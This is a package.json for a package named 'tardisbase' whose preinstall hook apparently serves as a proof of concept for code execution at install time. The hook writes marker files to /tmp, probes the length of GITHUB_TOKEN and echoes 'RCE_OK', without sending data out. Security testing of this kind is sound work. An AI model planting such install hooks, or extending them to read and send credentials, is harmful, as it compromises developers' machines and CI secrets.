{
  "name": "tardisbase",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "echo POC_MARKER_TARDISBASE > /tmp/POC_MARKER_TARDISBASE.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_TARDISBASE.txt; echo RCE_OK >> /tmp/POC_MARKER_TARDISBASE.txt; cat /tmp/POC_MARKER_TARDISBASE.txt"
  }
}